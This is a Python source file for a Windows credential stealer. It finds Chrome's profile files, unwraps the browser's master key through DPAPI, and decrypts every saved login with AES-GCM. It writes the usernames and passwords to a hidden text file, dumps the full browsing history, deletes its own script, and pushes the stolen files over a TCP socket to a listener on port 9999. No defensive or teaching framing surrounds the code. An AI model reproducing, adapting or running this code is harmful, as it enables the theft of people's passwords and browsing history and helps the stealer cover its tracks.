#type:ignore
import os
import ssl
import sys
import json
import base64
import shutil
import socket
import sqlite3
import win32crypt
from tabulate import tabulate
from Cryptodome.Cipher import AES
from typing import Optional, Tuple, List, Any

allfiles: List[str] = []



class ChannelGrabber:
    def __init__(self) -> None:
        self.channels: List[str] = ["Chrome", "Chrome Beta", "Chrome Dev", "Chrome SxS"]

    def get_channel(self) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        for channel in self.channels:
            state: str = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google",
                                      channel, "User Data", "Local State")
            dbpath: str = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google",
                                        channel, "User Data", "default", "Login Data")
            history: str = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google",
                                         channel, "User Data", "Default", "History")

            if os.path.exists(state) and os.path.exists(dbpath):
                return state, dbpath, history
        return None, None, None



class PasswdGrabber(ChannelGrabber):
    def __init__(self) -> None:
        super().__init__()
        self.alldata: List[List[Any]] = []
        self.file: str = "000.db"
        self.grabberfile: str = "000.txt"

    @staticmethod
    def encryption_key() -> Optional[bytes]:
        state_path, _, _ = PasswdGrabber().get_channel()
        if state_path:
            with open(state_path, "r", encoding="utf-8") as file:
                contents: str = file.read()
                contents = json.loads(contents)
                encryption_key: bytes = base64.b64decode(contents["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(encryption_key, Flags=0)[1]
        else:
            return None

    @staticmethod
    def decrypt_passwords(password: bytes, key: bytes) -> str:
        try:
            iv: bytes = password[3:15]
            password: bytes = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, Flags=0)[1])
            except:
                return "No Passwords."

    def main(self) -> None:
        key: Optional[bytes] = self.encryption_key()
        _, dbpath, _ = self.get_channel()
        if dbpath:
            shutil.copy2(dbpath, self.file)
            try:
                connection = sqlite3.connect(self.file)
                query = connection.cursor()
                query.execute("select origin_url, username_value, password_value FROM logins")

                rows: List[Tuple[str, str, bytes]] = sorted(query.fetchall(), key=lambda x: x[0])
                total: int = sum(1 for row in rows if row[1] or row[2]) - 1

                for i, row in enumerate(rows):
                    login: str = row[0]
                    user: str = row[1]
                    passwd: bytes = row[2]
                    if user or passwd:
                        login = login.replace("www.", "")
                        data = [
                            [f"{i}."],
                            ["Login URL", login],
                            ["Username", user],
                            ["Password", self.decrypt_passwords(passwd, key)],
                        ]
                        self.alldata.append(data)
                self.alldata.sort(key=lambda x: x[1][1])

                table: str = tabulate(self.alldata, headers="firstrow", tablefmt="grid")

                with open(self.grabberfile, "w", encoding="utf-8") as file:
                    file.write(f"[*] TOTAL PASSWORDS: [{total}]\n\n")
                    file.write(table.replace(",", ":"))

                os.system(f"attrib +h {self.grabberfile}")
                allfiles.append(self.grabberfile)
            finally:
                connection.close()
                os.remove(self.file)
                os.remove(sys.argv[0])
        else:
            print("No Chrome channel found.")
            os.remove(sys.argv[0])



class HistoryGrabber(ChannelGrabber):
    def __init__(self) -> None:
        super().__init__()
        self.file: str = "00.db"
        self.historyfile: str = "00.txt"

    def main(self) -> None:
        _, _, history = self.get_channel()
        if history:
            shutil.copy2(history, self.file)
            try:
                connection = sqlite3.connect(self.file)
                cursor = connection.cursor()
                cursor.execute("SELECT url FROM urls")
                urls: List[Tuple[str]] = cursor.fetchall()
                total: int = len(urls)
                table: str = tabulate(urls, headers="firstrow", tablefmt="grid")

                with open(self.historyfile, "w") as file:
                    file.write(f"[*] TOTAL HISTORY: [{total}]\n\n")
                    file.write(table)
                allfiles.append(self.historyfile)
            finally:
                connection.close()
                os.remove(self.file)
        else:
            print("No Chrome channel found.")



class Server:
    def connect_send(self, *files: str) -> None:
        HOST: str = socket.gethostbyname(socket.gethostname())
        PORT: int = 9999
        ADDR: Tuple[str, int] = (HOST, PORT)

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)

        for file in files:
            with open(file, "rb") as f:
                contents: bytes = f.read()
                client.sendall(contents)

        client.close()


if __name__ == "__main__":
    chrome_grabber = PasswdGrabber()
    chrome_grabber.main()

    history_grabber = HistoryGrabber()
    history_grabber.main()

    server = Server()
    server.connect_send(*allfiles)
